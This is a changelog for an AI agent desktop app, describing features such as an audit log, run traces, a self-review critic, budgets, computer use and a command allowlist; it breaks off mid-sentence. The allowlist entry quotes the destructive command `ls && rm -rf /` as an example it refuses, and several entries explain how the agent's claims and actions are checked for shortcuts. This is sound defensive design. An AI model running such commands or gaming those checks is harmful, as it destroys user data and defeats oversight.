# Changelog

Notable changes per release. This project follows [semantic versioning](https://semver.org/):
the major version changes when stored state or the plugin API breaks, minor for
features, patch for fixes.

## 0.3.0

修复了一些已知问题并进行大幅升级与优化. Most items come from a live end-to-end audit of the agent against its own workspace.

### Added

**Knowledge base editing and retirement.** `kb_upsert` no longer silently creates a second node for an existing title; entries can be edited or retired. Tools and API only for now, no UI buttons yet.

**Plan autopilot.** Plans advance on their own until done (cap 40 steps, `SHE_PLAN_AUTOPILOT=0` turns it off), and the bundled skills explain how to plan.

**Version-controlled skills.** Bundled skills now live in `skills/` (previously the gitignored `.she/skills`, still used as a fallback) and are staged into the desktop build.

**Chat attach.** Switching back to a chat mid-turn resumes the live chain-of-thought stream instead of waiting for the turn to finish.

**Markdown rendering.** Tables (with alignment and horizontal scroll), numbered lists, block quotes, rules and h4 to h6 headings.

### Fixed

- Scheduler: a task that comes due while its session is busy is queued and retried instead of failing; manual runs no longer consume a one-shot task's real fire; finished one-shot tasks are pruned after 7 days and hidden from `schedule_list` by default.
- `reflection_check` no longer compares tool-call counts against plan steps.
- Error book: intentional negative tests can be marked `expect_failure`; the header shows the real count; hints are specific.
- LSP: columns are correct in files with a BOM, and the open-document cache no longer goes stale.
- `grep` glob matching.
- The default port is 5577 everywhere (env doctor, perf smoke, docs, theme studio).

## 0.2.0

This release is mostly about the gap between "works" and "trustworthy": measuring
claims instead of asserting them, and fixing several places where the app could lose
data or money quietly.

### Added



**Code intelligence (LSP).** Four tools (`lsp_diagnostics`, `lsp_definition`,
`lsp_references`, `lsp_hover`) driven by a real language server — the same compiler
the user's editor uses. `grep` can say a name appears 40 times; it cannot say which
one is the declaration or what breaks if a signature changes.

**Scheduled work.** `schedule_create` / `schedule_list` / `schedule_cancel` /
`schedule_window` let the agent plan its own future work, plus a panel to manage it.
The working window governs when work may *start*: a task that comes due outside it is
deferred to the next opening, never dropped, and a run in flight is never interrupted
because the hours ended.

**Project conventions are read.** `AGENTS.md`, `CLAUDE.md`, `.cursorrules` and
`.github/copilot-instructions.md` alongside our own `.she/rules.md`. An agent that ignores
a repository's own convention file looks like an outsider — and `AGENTS.md` is what Cursor
reads, so a project arriving from Cursor keeps its rules there. Several files are MERGED (a
team that has changed tools has more than one, and honouring only the first would drop
conventions they wrote), each labelled with its source so a conflict can be reported rather
than silently blended. In a monorepo the search walks up to the repository root and stops
there: reading above it would apply a stranger's rules to the user's project.

**Documentation is checked against the code.** `pnpm check:docs` fails when a doc points at
a file that does not exist, when a quoted count has gone stale, or when a `TODO`/`FIXME`
marker appears in shipped docs. Both existing docs had drifted: `README.md` and
`CONTRIBUTING.md` told readers to run `scripts/one-click.ps1` long after the cross-platform
launcher replaced it, and `FEATURES.md` pointed at an adapter directory that had been
deleted.

**Custom stylesheets, with the guard rails that make them safe.** The whole UI is built on
CSS custom properties, so it can be rethemed without forking — `~/.she-app/theme.css` is a
plain file, editable by hand or from **Settings → Custom stylesheet**, with a live preview
(scoped, see Fixed) and a button to insert any of the common variables.
A stylesheet is the one input in this app that can make the app unusable, so the safety is
the feature: `html { display: none }` and `* { pointer-events: none }` are refused **before
they are saved**, with the line number and the reason; unbalanced braces are refused because
an unclosed rule swallows the rest of the file, so the result has nothing to do with what was
written; remote `@import` is refused because it leaks that this machine is running the app.
Deliberate choices are not policed — warnings do not block, and `?force=1` overrides errors
while marking the save as forced. Recovering does not require the UI, which is the only
property that matters when the UI is invisible: `?theme=off` in the address bar or
`POST /api/theme/disable` from curl both work. Disabling keeps the content, every save keeps
the previous version for a one-click revert (and that revert is itself revertible), and the
stylesheet lives in the app directory rather than the workspace, because a workspace-local
copy would silently restyle the app on every workspace switch — the same bug the wallpaper
had.

**Model registry.** Declare several endpoints in `she.config.yaml` and select one with
`activeModel` / `SHE_MODEL`, so "which vendor" is a config change rather than a code
change. `subagentModel` points delegated subtasks (grep, read, summarise) at a cheaper
model — the easiest cost saving available, since they do not need the reasoning model.
`${VAR}` in the config expands from the environment, so the file can be committed
without secrets.

**Pre-flight intent analysis, before the work instead of after it.** Non-trivial tasks now
call `preflight_record` first, which writes down four things that routinely disagree: what the
user literally asked for, the constraints nobody stated, the goal they actually want, and what
must be asked before starting. The deliberate part is that the analysis is **split in two**. A
deterministic half — no model call, free, runs in the gate — reads the request for `@file:` /
`@folder:` / `@symbol:` references, time expressions and destructive wording, and checks each
against the workspace and the tool list this agent was actually given. It reports each as a
prerequisite marked ✓ / ✗ / !, and the `✗` cases are the ones that used to surface halfway
through a plan: a file the user pointed at that does not exist, a path outside the sandbox,
"remind me tomorrow" in a session with no scheduling tool, a symbol reference with no language
server. Because only the checked facts can be trusted, `preflight_record`'s stated confidence is
**clamped** to what they support and the clamp is reported rather than applied quietly. Records
land in `.she/preflight/`, one file per analysis, so a decision can be audited afterwards
instead of taken on trust. `pnpm check:preflight` covers it — offline, no port, no stub, since
the deterministic half makes no model call by design.

**Tool results are classified, and every failure says what to do next.** The loop used to look
only for `^Error:` in a tool's output, which hid two failures that matter. A non-zero exit code
was counted as **success** — `shell` renders `exit code: 1` as ordinary text — and `No matches
found` read as **data**, when the honest answer is "nothing"; that gap is exactly the pressure
that leads a model to fill it in. `packages/agent-runtime/src/tool-result.ts` now reads every
result into one of eleven kinds — wrong arguments, refused by the sandbox, tool not available,
target missing, state precondition unmet, empty result, endpoint unreachable, timed out, rate
limited, non-zero exit, unrecognised — and attaches the one thing that can work next. `retryable`
is part of that verdict, so a call that cannot succeed differently is no longer retried: a
timeout is worth resending with a smaller request, a wrong argument is not worth resending at
all — and the runaway-loop detector reads it too (see the budget entry below), giving a
transient failure one more attempt before the repetition is treated as being stuck.
Waiting for a human (the confirm gate, a staged patch) is a **state** and deliberately not a
failure, and the classifier only reads shell status as a whole shape, so a command that merely
*prints* `exit code: 1` or `(timed out)` is not mistaken for one that failed. `pnpm
check:toolresult` drives the real tools and a real agent turn, and additionally extracts every
`Error:` message from the source tree and asserts each one classifies — so a tool whose error
text changes under the classifier fails the gate instead of silently degrading to "unknown".

**Runaway-loop detection, with one recovery attempt.** A loop that is *stuck* — same
tool, same arguments, same result — is detected after three rounds. The model is then
told once that its approach is producing nothing and asked to try something different;
only if it repeats again does the run stop, with an explanation. The round limit alone
only ever caught loops that never end.

**An error book, so a mistake is paid for once.** A classified failure reached the model for one
turn and was then thrown away: the transcript is a linear log read top-to-bottom, and it is not a
place you can ask "has `grep` burned me before?". Failures are now written into the knowledge
base — the durable, retrievable store that already exists — under `errors/<tool>`. Two
occurrences of the same mistake are one node with a count rather than two nodes, because
recurrence is the signal that an entry is worth reading and a duplicate per occurrence would bury
it under its own repeats; a repeat also counts as a *vote* that the entry matters, so the node is
promoted in retrieval. The book records only what the agent got **wrong**: bad arguments, a
refused action, a tool that is not there, a missing path, a failed command, and a stuck loop.
`timeout`, `service` and `rate_limited` are weather, not lessons and are deliberately skipped;
`empty` is skipped because a search that matched nothing **answered the question**. Entries are
`tool_outcome`, never `fact` — an observation about this machine is not a truth about the world —
and nothing is written into a fact group, so the book cannot start answering questions about the
world with "this once timed out". Two failures in one turn are linked with `co_occurrence` and
nothing stronger: "observed together" is a fact, "A caused B" is a claim this cannot support.
Writes come from the agent loop, where the evidence is; the model gets a read-only
`errorbook_lookup`, because a tool that let it write its own notes would fill the book with
plausible lessons nobody ever observed. `preflight_record` consults the book before the work
starts and puts what it found in the analysis, ahead of the prerequisites. `pnpm
check:errorbook` drives real tools, a real agent turn (including a stuck loop) and a real SQLite
store, and reads the rows back — it caught the query filter silently returning nothing, because
it matched the retrieval trace against `errors/` while the engine renders that path as
`errors → shell`.

**An entry in the error book can be retired, and retiring is not the same as silencing.** Some
entries are wrong the moment they are written: a failing test that was failing *on purpose*, or a
reflection that read a knowledge-base retrieval in the transcript as a drifting tool call. With no
way to say so, the only thing a user could do was learn to skip the book — which turns off the true
entries with the false one. `errorbook_forget` takes the node's id and a reason, records both on the
node, and hides it from `errorbook_lookup` and from the pre-flight analysis. Retired rather than
deleted, because the reason is the useful part if the same entry is written again: a **repeat of the
same failure clears the retirement**, marks the node `reopened`, and counts up, so a retired entry
that keeps happening comes back on its own instead of staying hidden. Writing is untouched —
retirement is a statement about reading.

**Plans are a graph, so a plan can be resumed instead of re-derived.** A plan was a flat list
with five statuses, which meant two failures that both read as success. A step could be marked
`done` while the step it needed was still pending — the plan then reported `4/4 完成` over work
that was never done, and the number is exactly what a reader trusts. And a step that could not be
done had nowhere to say so: `blocked` was a mark with no instruction, so a plan parked forever
and looked, from the outside, the same as one that had finished. Steps now declare `depends_on`
and `on_failure`. Starting or finishing a step whose prerequisites are not `done` is **refused**,
and the refusal names the step in the way rather than reporting a generic failure — the model is
told what to do, not that something went wrong. `on_failure` is the plan's own instruction for
what happens when a step dies: `retry` (try another approach), `skip` (**cascades** — the steps
that declared they needed it are dropped too, with a note naming the culprit, because a step
waiting for input that will never arrive is a plan that hangs), `ask` (this needs the user), and
`stop`. `retry` counts attempts rather than looping quietly: "tried 3 times" is a decision point,
and an untracked retry is a silent one. The rendered plan ends with **`下一步: s2 构建产物`**, and
that line — not the status marks — is what "resume" reads: after a restart, or in a different
conversation, it already accounts for which prerequisites are done, and it comes from the same
rule as the tool output so the two cannot disagree. A plan that finds new work reopens rather
than staying closed, and dependency cycles and dangling references are refused and not written to
disk, since a cycle means no step can ever start. `pnpm check:plan` drives the real tools, throws
the toolset away to simulate a restart, and reads the plan back from `.she/plans.json`.

**A hand-off has a shape, and "not verified" is not "done".** `report_write` used to produce the
same free-form document whether the agent was answering a question or handing back finished work,
and the two are judged differently: a report is read, a hand-off is relied on. `kind: "delivery"`
now uses a five-part template — conclusion, evidence, assumptions, risks, open questions — chosen
because those are the five that disagree with each other. **Evidence is required**: a conclusion
with nothing behind it is an assertion, and the user never saw the command that produced it. The
status is checked rather than asserted. `status: "done"` is refused while `open` has entries, and
refused while *this conversation's* plan still has steps that are not `done` or `dropped` — the
refusal names them instead of reporting a generic failure, and the same delivery is accepted as
`partial` with those steps listed. The scoping matters in both directions: a plan from another
conversation neither blocks a delivery here nor gets claimed by it, because the cheapest way past
a broader check would be to mark steps done to unlock the word "done" — the exact behavior the
check exists to prevent. `mode: "brief"` omits empty sections; `mode: "full"` requires that
assumptions and risks were considered (an empty list is an answer, a missing one is not), and
prints `（无）` rather than dropping the heading, since a heading nobody fills in makes a document
look complete. The artifact always carries the plan's remaining steps at the moment of delivery,
so the reader does not have to go and look. `pnpm check:delivery` drives the real tool, reads the
artifact back from the path the tool reported, and asks the plan whether the claim holds.

**An append-only audit trail, so "what did it actually do?" has an answer afterwards.** Every
other store in `.she/` is working state: tickets are a live cache, sessions are rewritten whole,
plans are edited in place. That makes them the wrong place to ask what happened, because the
answer is only worth anything if the record cannot have been edited since — a store that can be
quietly rewritten records what the current code wants it to say. `.she/audit.log` is one JSON
object per line and one append per record, nothing rewrites an existing line, and three junctions
write to it: the request (`/api/chat`), every tool call (the agent's own tool observer, so it sees
confirmed actions too), and every human approval. Ordering is a strictly increasing `seq` rather
than a timestamp, because timestamps tie at millisecond resolution and wall clocks move — and the
case that broke it was subtle: rolling the log appends its own `rotation` record, so picking the
number before the roll made that record and the one that triggered it claim the same value. Past a
size cap the file rolls to `audit-<stamp>-<seq>.log`, and a drop forced by the cap is itself
recorded — history that vanishes without a trace is the failure the trail exists to prevent. A
line killed mid-write is skipped when reading and **counted**, and the count is returned by `GET
/api/audit`, because quietly returning fewer records is indistinguishable from a quiet day. Long
messages are truncated with the original length kept alongside, so a cut record still says it was
cut. Approvals are checked against the ticket that is actually pending before they are written: the
record's one job is that "a human approved this" is true, so a forged or stale `ticket_id` is
refused with a 409 instead of being logged as an approval and then failing mid-stream. The endpoint
is read-only — no route writes, edits or clears a record — and the panel (Ctrl+K → 打开审计记录)
says so, since every other panel edits the thing it shows. `pnpm check:audit` asserts append-only
byte-wise, walks `seq` across a restart and across a rotation, reads the trail back over HTTP from
a real server, and confirms that a rejected request and a forged ticket leave nothing behind.

**Run traces, so a single turn can be opened again and read step by step.** The audit trail answers
"who authorised what"; it deliberately records the *junctions*, not the work between them. So "what
did it actually do, in what order, and did each step work" still had no answer a person could go and
read: the streamed chunks were a UI protocol and are gone when the tab reloads, the transcript holds
messages rather than steps, and the metrics are counters that cannot say which command produced which
output. `.she/runs/run-<stamp>-<hex>.jsonl` is one file per turn, one JSON object per line, append
only — the run that matters most is the one that died, so a half-written file has to stay readable.
The events are written by the **agent**, at the point it runs a tool, rather than reconstructed from
the chunk stream: that is the only scope that holds the tool name, the arguments, the output, the
duration and the classifier's verdict at once, and it is the only way a `stream: false` turn (which
produces no chunks at all) leaves a trace instead of an absence indistinguishable from a quiet run.
The file names are strictly increasing — the name is what decides the order, so it has to survive two
runs starting in the same millisecond *and* the wall clock stepping backwards, which a plain
timestamp does not. A turn stopped at a confirmation or apply gate is recorded as **paused**, not
finished: the continuation appends to the same file, which is what makes "a person approved this
step, and here is what happened next" legible; an interrupt, a detected stuck loop and the tool-round
cap each record their own reason, so none of them reads as a failure. Tool arguments are a common
place for an API key to appear and this is a **second** copy on disk, so credential-shaped values are
redacted *recursively* (a top-level-only pass reports `{ headers: { Authorization: … } }` as scrubbed
while leaving it in place), including the name/value pair form used by `env` arrays; a confirmation
ticket is replaced entirely, because whoever holds it can authorise the dangerous call and which
ticket it was is already attributable on its own event. Truncated fields keep their original length
so a cut record cannot be read as a short complete one, and unparseable lines are counted rather than
dropped. `GET /api/runs` lists, `GET /api/runs/:id` replays, and both are read-only, matching the
audit panel (Ctrl+K → 打开运行轨迹). Retention is bounded and the prune is **recorded in a file that
survives** — the deletion itself names what it deleted.

The traces also close the gap the delivery template left open in the previous entry: a hand-off is
required to state its evidence, and now that the runs are on disk that claim can be **checked**
instead of trusted. `GET /api/runs/corroborate` refuses a line that names a tool this conversation
never ran — the invented-citation case, and the reason the evidence prefix is read as a claim about
*which* tool — and otherwise reports whether any distinctive token from the line appears in a
recorded step. It is deliberately lenient in the direction that matters: an honest report that
paraphrases must not be blocked, so it can say "nothing here is backed" but never "this was quoted
correctly". `pnpm check:runs` covers the invariants and drives a real server, including that the
corroborate route is registered before the `:id` route (otherwise it is read as a run named
`corroborate`) and that no route can write, edit or clear a trace.

**Self-review, so the agent can notice it is going wrong while it still matters.** The errorbook
taught it to *file* a mistake and the traces made each turn readable afterwards, but nothing ran
those two ends together: a lesson was only written when a tool already failed, and no one compared
what the agent *said* against what it *did*. Three deterministic pieces now do.

*Drift detection* compares the request's goal and constraints against the actions and plan steps
so far, purely lexically. It separates **hard** constraints (an explicit prohibition, a
`must not` / 「不要」 phrasing) from soft preferences, because treating a preference as a violation
produces a check that cries wolf and gets ignored, and it reports the prohibited *object* rather
than the sentence, so the message names what was touched. Only a hard violation sets
`replan: true`; a soft one is a note. The whole feature is deliberately not a model: a self-review
that can hallucinate a violation is worse than none, and this one has to be trustworthy enough to
be believed on the turn where the agent most wants to explain itself away.

*Confidence calibration* keeps `.she/reflection/confidence.json` and compares what the agent
**claimed** during pre-flight against what actually happened — the ratio of tool calls that
succeeded to those attempted. A windowed view means an old stretch of bad luck stops colouring the
present, and the returned state is only `overconfident` / `underconfident` / `calibrated`: the
point is to be told which way it is off, not to see a number to rationalise. Two inputs are
required and either may be missing — no self-assessment means no sample, a turn with no tool calls
contributes no success rate rather than a perfect 1.0 — so a turn that claims confidence and does
nothing cannot be scored as well-calibrated. A `succeeded` greater than `attempted` (a caller
miscounting) is clamped, because the arithmetic otherwise reports *underconfidence* for a bug in
the *input*. The result is injected as a short block in the system prompt with the prefix kept
byte-identical, so this does not throw away the prompt cache it exists to protect.

*Reflections become lessons.* Drift, recurring overconfidence, the same tool failing again and a
run that hit the iteration cap are written through the KB primitives into `errors/自省`, with the
topic as the signature so a repeat **increments a count** rather than appending a near-duplicate.
`errorbook_lookup` was widened to match reflection topics, since a lesson that cannot be found
again is a diary, not a lesson.

*An independent critic* reads the answer's claims against the recorded run: a claim that a tool
succeeded when its last run failed is `contradicted` (`fail`); a tool that never ran, or an
artifact that does not exist, is `unbacked` (`concerns`); generic prose is `unverifiable` and
stays out of the verdict. It is a separate role (hue 350, review phase) and is driven in the
cluster between work and review, so the check is not the same pass that produced the work.
Citations are filtered to artifact-shaped ASCII tokens — an earlier version treated Chinese
four-grams as quoted evidence and flagged ordinary prose as uncorroborated. `GET /api/reflection`
serves the mirror and is readable in a **new process** from the file on disk, and
`POST /api/reflection/confidence/reset` records a `config` entry in the audit trail, because
resetting someone's calibration history is a change worth being able to date. `pnpm check:reflection`
drives real tools and a real server for all of the above and refuses to pass on the fuzzy cases:
a soft constraint must *not* read as drift, and insufficient samples must *not* produce a verdict.

**A budget you turn on, so no ceiling can cut real work short by default.** Every long-running agent
eventually needs a stop condition that is not "the model decides to stop", and every implementation
of one has the same failure: it arms itself, and a task that would have finished is truncated for a
user who never asked for a limit and has no way to see why. So the ceiling is a switch —
`budget.enabled: false` and `0` on every axis in `DEFAULTS`, with `SHE_BUDGET_ENABLED` /
`SHE_BUDGET_MAX_TOOL_ROUNDS` / `_MAX_TOOL_CALLS` / `_MAX_TOKENS` / `_MAX_SECONDS` for an operator who
wants it without editing YAML. With it off, `budgetStop` cannot return a stop for any usage, which
is asserted end-to-end rather than assumed.

*Checked where stopping is still free.* Three junctions, each **before** the work they guard: before
a model round (`maxToolRounds`), after a response arrives and its usage is known but **before** its
tools run (`maxTokens`), and between tool calls inside one response (`maxToolCalls`, `maxSeconds`).
A ceiling tested after the fact has already spent the thing it was protecting.

*Stopping is not failing.* A budget stop goes through its own ending — `endTurnForBudget`, run
reason `budget` — not `failTurn`, so it is not counted as a crash, does not enter the errorbook, and
does not read as a result. The message names the axis, the ceiling, how much was used, and states
plainly that this is not a task failure and that 「继续」 will pick up from here. Calls already
present in the response that will not run are closed with `{ not_run: true, reason:
'budget_exceeded' }`, because a `tool_calls` block with no matching result is a transcript the next
request cannot be built on — the turn has to be interruptible *and* appendable.

**Read-only tools start together; nothing else does.** Independent reads are the one place
concurrency is free of correctness risk, so they are run in waves — but only the **leading
contiguous run** of read-only calls is prefetched, and only for names on a static allowlist
(`fs_read`, `fs_list`, `grep`, `git_status` / `_diff` / `_log`, `kb_query`, `errorbook_lookup`,
`memo_list`, `plan_list`, `schedule_list`, `schedule_window`, `reflection_check`). The first call
that is not on that list — including a name the runtime has never seen — ends the wave and
everything after it goes through the serial path, which is the conservative direction: a wrong
"this is safe to parallelise" would interleave a write with a read, while a wrong "this is not"
costs a few milliseconds. Waves are capped by `MAX_PARALLEL_READS` (4).

**The same read asked twice in one turn touches the disk once.** Identity is the tool name plus its
arguments under a canonical key order, so an argument map rewritten in a different order is the same
query and not a miss. The cache lives for exactly one turn and is cleared the moment any call that is
not read-only runs — not on a heuristic that a tool "probably" writes, but on the refusal to assume
otherwise — so a read that follows a write cannot receive pre-write contents with nothing to
distinguish it from a correct answer. A reuse is reported as a status line rather than happening
silently, and the reused result is byte-identical to the first. `pnpm check:budget` drives all of
this through a real `Agent`, and asserts the two things a regression would break quietly: that the
off switch is really off, and that a write always invalidates.

**Prometheus-style process metrics** at `GET /api/metrics`: turns, latency (avg and
p95), token breakdown, tool usage and failures, and the **prompt-cache hit rate**. The
last one matters most — a cache regression is invisible until it appears on a bill.

**Cross-platform.** `scripts/she.mjs` runs on macOS, Linux and Windows, with thin
`./she.sh` and `SHE.bat` wrappers. The previous launcher was PowerShell only, so other
platforms had none.

**Container image.** `Dockerfile` for private/self-hosted deployment, plus
`SHE_HOST` and `SHE_ALLOWED_HOSTS` for binding beyond loopback and `SHE_CONFIG_FILE`
for keeping the config on a volume. The image has not been built here (no Docker
available) — `scripts/docker-check.mjs` verifies its structure.

**Verification eval.** Five tasks where a plausible answer is wrong unless the agent
actually checks: a script that exits 0 while printing an error, a test that fails, a
documented version that disagrees with the manifest.

**Release packaging.** `pnpm release` runs the gate, builds, and writes
`release/she-v<version>.{zip,tar.gz}` with a manifest recording the commit and whether
the gate passed. `pnpm release:verify` extracts that archive, installs it, builds it,
boots it and probes it — the check that separates "has the right files" from "works".

**Computer use.** `computer_click` / `computer_type` / `computer_key` /
`computer_scroll` drive the mouse and keyboard, so the agent can operate software that
has no API — the `screenshot` tool already let it *see* the desktop; these let it act.
Gated behind `SHE_ALLOW_COMPUTER_USE`, which is **deliberately separate** from
`allowAllCommands`: that flag answers "may the agent run commands in my workspace?", this
one answers "may it move my mouse and type into whatever has focus?" — a different
question, because the agent cannot see the edge of the screen and a stray click can reach
a banking tab. Windows only; every action is still `isDangerous`, so the strongest
setting requires two separate opt-ins.

**Command allowlist.** `SHE_ALLOWED_COMMANDS` is the fail-closed counterpart to the
existing denylist: the denylist can only block harmful forms someone anticipated, while
an allowlist refuses everything not named. Every command in a line is checked (so
`ls && rm -rf /` is refused even though it starts with something allowed), and shell
substitution (`$()` / backticks) is refused because what it runs cannot be inspected.
Opt-in, because switching it on breaks any workflow whose commands are not listed.

**Transient-failure retry.** 429 and 5xx are retried with exponential backoff and
jitter, honouring `Retry-After` when the provider sends one. Other 4xx fail
immediately: a bad request stays bad, and retrying only delays the error and multiplies
the bill. Previously a momentary rate limit failed the turn outright — and when a
fallback endpoint was configured, silently switched models mid-task.

**Request timeout.** A provider that accepts the connection and then goes quiet no
longer hangs the turn indefinitely. 300s by default, `SHE_LLM_TIMEOUT_MS` to change it.

**One turn at a time per conversation.** A second `POST /api/chat` while a turn is
running now gets **409** with an explanation, instead of interleaving writes into the
same history. The UI already prevented this; the API is reachable from two windows,
from scripts, and over the network, so the guarantee belongs in the server.

**`SHE_LLM_STREAM=off`.** For a proxy that buffers or drops streaming responses, the
reply then arrives in one piece at the end instead of incrementally.


**A restart check.** `check:restart` boots a server, makes changes through the API — settings,
sessions with history, a work group with a custom role, a scheduled task and working window, a
memo, a skill file — then **kills it without a graceful shutdown** and boots a second one,
asserting every piece is back. A third boot with a deliberately truncated state file asserts
recovery keeps a backup of the original bytes. The hard kill is the point: it is what a user
actually hits, and the case where a non-atomic write leaves a torn file. "Settings are not kept"
was this project's original complaint and no test had ever restarted a server, because the
whole class of bug lives in the seam between two processes rather than inside one.

**An encoding check.** `check:encoding` drives the API with Node's `fetch` — deliberately not
PowerShell, whose `Invoke-RestMethod` encodes a `-Body` string as latin1 and garbles Chinese
*before it reaches the server*, producing the same symptom as a real bug. It covers titles,
message content, work-group and role names, memos, skill filenames, the bytes on disk, the
`charset=utf-8` header, and readability of Chinese error messages, then restarts and re-checks.
A garbled title had been reported on this project and written off as the user's own input; the
round trip is in fact clean everywhere, so that symptom came from a command-line caller.

**A log-rotation check.** `check:logs` exercises the real `capLog` implementation (extracted
from the launcher, not a copy that could drift) against an oversized file, and pins that
truncation keeps the newest lines, never splits a multi-byte character, and leaves an undersized
file alone.


**Plugin end-to-end check.** `check:plugins` boots a real server with a stub model and verifies the
chain a user depends on — not the pieces in isolation: install a plugin through the API, confirm the
agent's tool list *now offers it*, confirm a call to it actually executes and returns real data
(the check asserts the summary mentions files that exist in the fixture workspace), uninstall it, and
confirm the agent no longer receives it **without a restart**. `plugins.test.ts` had ~48 good cases,
but every one called `PluginManager` directly, so the whole feature could have been inert — tools
loaded but never merged into the agent, or installs that only took effect after a restart — and
nothing would have failed. Negative-tested by removing the tool merge, which the check catches.

**Conversation migration, as opposed to attaching files.** Importing an existing Cursor / Claude Code
/ Codex conversation now creates a **real conversation** in the list, with the turns parsed out of the
original record, rather than copying a file into `.she/imports/` and appending one message to the
current chat listing its path. The old behaviour meant importing twenty conversations left the user
with one chat, no way to open any of the twenty, and nothing resembling their history — it was
"attach as context" wearing the name "import". The original record is still copied first (the point is
to preserve the primary source, not to replace it with our parse of it), and the provenance is
recorded on the session so "where did this come from" stays answerable.

**A delegated child gets its own copy of the knowledge base — and its notes come back.** Isolation
follows a declared `scope`, so a read-only child — the common case — was exactly the child pointed
straight at the parent's live database, holding the same memory rules as the parent ("write back with
`kb_upsert`"). Nothing reviewed those writes, and nothing distinguished them afterwards: `kb_upsert`
carries no provenance field, so a child's node is indistinguishable from one the parent wrote,
permanently. The first fix refused the write. The problem with refusing is that it leaves the child
with nowhere to put a finding: the conclusion survives only if the child remembers to repeat it in
prose, and a child that ran out of time never gets to. So every child — isolated or not — now runs
against a **private copy** of the parent's database, and the copy is not a dead drop: when the child
ends, the parent is handed what it wrote (titles plus the opening of each note, in the `task_spawn`
reply), the full text is written to `.she/subagent-notes/<child-session>.md`, and the copy is deleted.
Harvesting is a reading, not a merge — nothing reaches the parent's memory without the parent deciding
— which is the same rule the child was told. The copy lives in the app directory rather than in the
worktree, because a knowledge base is scaffolding and not work product: inside a worktree it showed up
as an untracked `.she/` in the changed-files list the parent reads. A child that cannot get a copy
(disk problem) still falls back to the parent's file with writes refused, and the handoff says which of
the three situations it is in — a copy, someone else's read-only database, or an empty one.

### Changed



**Fonts are vendored; the app no longer contacts Google.** `index.html` linked Inter and
JetBrains Mono from `fonts.googleapis.com`, so every page load made two requests to Google —
one of them a font download. Three reasons, in increasing order of importance: it contradicted
the app's own rule (the stylesheet validator refuses a remote `@import` with the message
"这会泄露你这台机器在运行本应用"), it made an offline-first desktop app need the network to look
like itself, and it was load-bearing rather than decorative — `CSS.getPlatformFontsForNode`
showed the UI's text really renders in `Inter-Bold` on Windows 10, where `Segoe UI Variable`
(from the top of the font stack) does not exist. Removing the link without vendoring would have
quietly changed the typography. The four woff2 files (172 KB, `latin`/`latin-ext` only) and the
generated `@font-face` rules are committed, so a normal build needs no network; `pnpm
vendor:fonts` regenerates them. `check:dist` now fails if any third-party font or stylesheet
reference reappears.

**Context handling: compaction instead of truncation.** History used to be trimmed
from the front each turn, which changed the request prefix and dropped the prompt-cache
hit rate to 0% for the rest of the conversation. Measured: appending kept 74% of a
7.3k prompt cached, front-trimming kept 0%. Compaction produces a frozen, append-only
digest, and a live session now measures 96–97% cache hits — about 3% of full price.
See `docs/context-and-caching.md`.

**Buttons: filled rather than outlined.** A 1px border competes with the text beside
it; macOS and iOS use a low-opacity fill for secondary controls instead. Icons are now
one stroked SVG set rather than a mix of text characters and emoji, which came from
different typefaces at different weights.

**Unified launcher.** `scripts/one-click.ps1`, `launch-she.ps1`, `start.cmd` and
`start-desktop.cmd` were replaced by one cross-platform implementation. The `.bat`
files were also fragile: PowerShell reads a `.ps1` as ANSI without a BOM, so one
stray non-ASCII byte broke the script's *syntax*.

**A delegated subtask reports what it is doing, and the reply after a timeout is an
account rather than a verdict.** Two problems measured on a real run, both of which made
`task_spawn` unusable for heavy work:

*Reliability.* A subtask already trimmed to its smallest form ran into the fixed 180s
ceiling and returned nothing at all. The budget is now a parameter — `timeout_ms` per task,
clamped to 30s..30min — because the right number depends on the job (a wide search finishes
in seconds, a full build does not), and the brief now states the deadline and asks for a
partial conclusion before it expires. A child told the number can hand in what it has; a
child that finds out by being killed cannot.

*Visibility.* The reply was `子任务超时（180s）` and nothing else, so 180 seconds of work left
no trace: the parent could not tell what had been done, and its only move was to dispatch the
same task again and pay for it twice. The timeout reply now reports how far the child got
(the last tool calls, in order, with their salient argument), the last thing it said in its
own words, what it changed — and names both ways to give a heavy task room next time. Running
children also emit a heartbeat every 5s, which the task card shows in place
(`23 次调用 · shell pnpm test · 已 95s`). That reading is for whoever is *watching*: the parent
agent is suspended inside the tool call and cannot be shown anything mid-flight, which is
exactly why the timeout report has to exist as well as the heartbeat.

**Two replies stop repeating themselves.** Both are called many times per task, so what they
echo is what the task pays for again and again — measured on a real run: ~15 `plan_update`
calls and ~10 `kb_query` calls, together the largest identified share of a 2.3M-token session.

`plan_update` re-sent every step's note on every call. It now prints every step and its status
(short, and it is what makes the plan readable as a whole) but the note only for the steps
*that call* moved — including the ones it moved as a side effect, which is why the filter is
derived by comparing the plan before and after rather than from the arguments: completing a
step activates the next, starting one sends the previous active step back to `pending`, and
`skip` drops everything downstream. Measured on an 8-step plan: 498 → 242 characters per
update. Nothing is lost; `plan_list` still prints every note, and the tool description says so.

`kb_query` returned each activated node's full text. Node lengths are bimodal — a convention
or a port is tens of characters, an ingested document is thousands — and one query activating
ten long nodes was ten documents re-sent on every lookup. Replies are now summarised to the
first 200 characters, which leaves the common memory *complete* (so a hit does not cost a
second call) and cuts only the long tail; `full: true` returns the original text when the exact
wording matters. Truncation is stated, never silent: a summary presented as the text is worse
than a long reply.

`pnpm check:cost` measures both on every run and pins the half that a cost fix usually breaks —
that what was cut is repetition and not information. It asserts the plan reply still lists every
step with its status and that every note is still readable through `plan_list`; and that a
shortened node still arrives with its title and id, that short memories come back verbatim, and
that `full: true` restores the stored text byte for byte. Its own numbers, on a 12-step plan with
full-length notes and a 9-node query: `plan_update` 898 → 354 characters per call (12 calls:
10779 → 4242, −61%), `kb_query` 2363 default against 10432 with `full: true` (−77%). Both
directions were checked by mutation — dropping either filter makes the check fail rather than the
bill look better.

Measuring the trim against the real artifacts rather than a fixture is what turned up the next
thing, and it is worth writing down because it was invisible from the source. Replayed on the
actual 10-step plan and the actual 88KB knowledge base from that run, `plan_update` saves 49%
(18663 → 9532 characters over 10 updates — and the old replies *grew* with each update, 968 →
2709, which is the signature of the repetition: re-printing every note accumulated so far, so the
cost is quadratic in the number of steps). `kb_query` saves less than the fixture suggested — 31%,
not 77% — and the reason is not node length. A broad query on this library activates 17–25 nodes,
and each node carries an envelope (title, kind, score, group path, node id) that the summary does
not touch: across 8 real queries the envelope was 21816 of 42441 characters, 51% of the reply at
179 characters per hit. So a `budget` parameter that could ask for fewer hits would be worth more
than a smaller preview — except it cannot, and the tool description said otherwise. `budget` bounds
the *scan*; the only result cap is `MAX_RESULTS = 40` in the engine, and the engine's own comment
notes that a larger budget "can only ever ADD results — never remove them". Measured: querying
